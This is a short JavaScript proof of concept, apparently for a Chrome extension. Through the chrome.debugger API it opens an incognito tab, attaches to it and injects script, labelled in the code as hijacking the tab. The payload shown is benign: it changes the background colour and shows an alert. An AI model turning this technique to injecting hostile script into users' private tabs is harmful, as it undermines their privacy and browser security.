(async () => {
    const TARGET_URL = 'https://www.example.com/'
    const CDP_VERSION = '1.3'

    // Open new tab in incognito window
    await chrome.windows.create({url: TARGET_URL, incognito: true})

    // Attach to new tab
    const targets = await chrome.debugger.getTargets()
    const target = targets.find(item => item.url === TARGET_URL)
    await chrome.debugger.attach({targetId: target.id}, CDP_VERSION)

    // Wait for tab to be ready
    await new Promise(resolve => {
        chrome.debugger.onEvent.addListener((source, method) => {
            if (source.targetId !== target.id) return
            if (method !== 'Page.loadEventFired') return
            resolve()
        })
        chrome.debugger.sendCommand({targetId: target.id}, 'Page.enable')
    })

    // Hijack tab
    const payload = () => {
        document.body.style.backgroundColor = 'teal'
        setTimeout(() => alert('Hello from outside the incognito window!'), 150)
    }
    await chrome.debugger.sendCommand({targetId: target.id}, 'Runtime.evaluate', {
        expression: `(${payload.toString()})()`
    })

    // Detach from tab
    await chrome.debugger.detach({targetId: target.id})
})()
